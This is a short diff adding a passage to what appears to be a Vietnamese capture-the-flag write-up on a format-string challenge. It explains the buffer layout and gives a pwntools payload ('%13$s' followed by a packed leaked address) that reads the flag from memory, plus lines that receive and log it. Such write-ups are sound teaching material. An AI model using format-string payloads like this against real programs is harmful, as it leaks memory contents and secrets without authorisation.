@@ -146,3 +146,13 @@ Tính địa chỉ chứa flag2:
 	flag2_addr=exe.address+0x4060
 
 ![Alt text](image/fs11.png)
+
+Vùng buffer thứ 2 cần dùng 8 BYTE đầu để nhập format để khai thác. 8 BYTE sau để nhập địa chỉ chứa flag2 leak được để %s đọc được.
+
+	payload=b'%13$sAAA'     	//Nhập %13s đọc flag2 và chèn kí tự rác cho đủ 8 BYTE
+	payload+=p64(flag2_addr)
+	p.sendlineafter(b'greeting: ',payload)
+	flag+=p.recvuntil(b'}')
+	log.info('flag: '+flag.decode())
+
+![Alt text](image/fs12.png)
